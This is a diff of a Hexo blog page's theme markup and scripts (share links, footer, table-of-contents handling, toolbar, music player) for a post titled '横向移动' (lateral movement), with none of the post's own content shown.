-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&name=横向移动 | xiaodisec&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&t=横向移动 | xiaodisec"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2021-2025
-    before
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
+  document.querySelectorAll('#toc-container .toc-list-link').forEach(function (link) {
+    var title = link.querySelector('.toc-list-text').textContent.trim();
+    var item = link.closest('.toc-list-item');
+    var level = (item.className.match(/toc-list-level-(\d)/) || [])[1];
+    var heading = headings.find(function (node) {
+      return usedHeadings.indexOf(node) === -1 &&
+        (!level || node.tagName === 'H' + level) &&
+        node.textContent.trim() === title;
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
-    })
-  })
-  </script>
+    if (!heading) return;
 
+    var target = heading.id ? heading : heading.querySelector('[id]');
+    if (!target) return;
+    usedHeadings.push(heading);
+    link.setAttribute('href', '#' + encodeURIComponent(target.id));
+    link.setAttribute('data-toc-target', target.id);
+  });
 
-<script src="/js/main.js"></script>
+  document.addEventListener('click', function (event) {
+    var link = event.target.closest('#toc-container .toc-list-link[data-toc-target]');
+    if (!link) return;
 
-<!-- search -->
+    var heading = document.getElementById(link.getAttribute('data-toc-target'));
+    if (!heading) return;
 
-<!-- Baidu Analytics -->
+    event.preventDefault();
+    event.stopPropagation();
+    window.history.pushState(null, '', link.getAttribute('href'));
+    heading.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }, true);
+});</script></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="https://jinggg1123.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button" aria-controls="post-sidebar" aria-expanded="true"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2021 - 2026 <span>💗</span> <a href="/null">jjjing</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2021-11-23T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: true,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: false,
+    path: '',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
 
-<!-- Cloudflare Analytics -->
+<script src="/js/plugins/dist/lazyload.min.js"></script>
 
-<!-- Disqus Comments -->
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
 
-<!-- utterances Comments -->
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
 
-</body>
-</html>
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/main.js" type="module"></script>
+</div></body></html>
